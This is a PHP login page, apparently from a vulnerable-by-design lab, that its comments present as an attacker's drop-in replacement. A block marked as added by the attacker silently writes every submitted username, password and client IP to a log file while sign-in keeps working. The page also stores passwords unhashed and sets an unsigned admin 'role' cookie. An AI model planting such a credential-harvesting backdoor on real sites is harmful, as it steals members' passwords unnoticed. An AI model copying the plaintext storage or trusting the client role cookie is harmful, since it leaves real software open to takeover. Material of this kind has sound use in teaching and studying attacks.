<?php
/* The sign-in page, with four lines added.
 *
 * Upload this as login.php and it replaces the real one. Everything still
 * works - members sign in, wrong passwords are still rejected, nothing on
 * screen changes - and every password typed into it is written to
 * captured.log on the way past.
 *
 * [VULN - passwords stored as written]
 * The column holds the password itself, so the check is a string compare.
 * Nothing here is hashed, which is why reading the table is the end of the
 * story rather than the beginning of a cracking job. */
require __DIR__ . '/../../db.php';

$page_title = 'Login';
$error = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    /* [ADDED BY THE ATTACKER]
     * Four lines, before the password is checked and before it would have
     * been hashed by a site that hashed anything. The page still works, so
     * nobody reports it. */
    file_put_contents(__DIR__ . '/captured.log',
        date('H:i:s') . "\t" . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'])
        . "\t" . $username . "\t" . $password . "\n", FILE_APPEND);

    $stmt = $conn->prepare("SELECT id, username, password, is_admin FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $row = $stmt->get_result()->fetch_assoc();

    if ($row && hash_equals($row['password'], $password)) {
        $_SESSION['user_id']  = $row['id'];
        $_SESSION['username'] = $row['username'];
        setcookie("role", $row['is_admin'] ? 'admin' : 'user', time() + 3600, "/");
        header("Location: /index.php");
        exit;
    }
    $error = "Invalid username or password.";
}

include __DIR__ . '/../../header.php';
?>
<div class="content">
<div class="container" style="max-width:500px;">
    <h2>Login</h2>

    <?php if ($error): ?><div class="alert alert-error"><?php echo h($error); ?></div><?php endif; ?>

    <form method="post" action="<?php echo h('/' . ss_login_url()); ?>">
        <div class="field">
            <label for="u">Username</label>
            <input type="text" id="u" name="username" required autocomplete="username" autofocus>
        </div>
        <div class="field">
            <label for="p">Password</label>
            <input type="password" id="p" name="password" required autocomplete="current-password">
        </div>
        <button type="submit" data-loading-text="Checking...">Enter</button>
    </form>
</div>
</div>
<div class="wave-footer"></div>
<script>SS.flash('msg', { loggedout: { text: 'Signed out', type: 'info' } });</script>
</body>
</html>
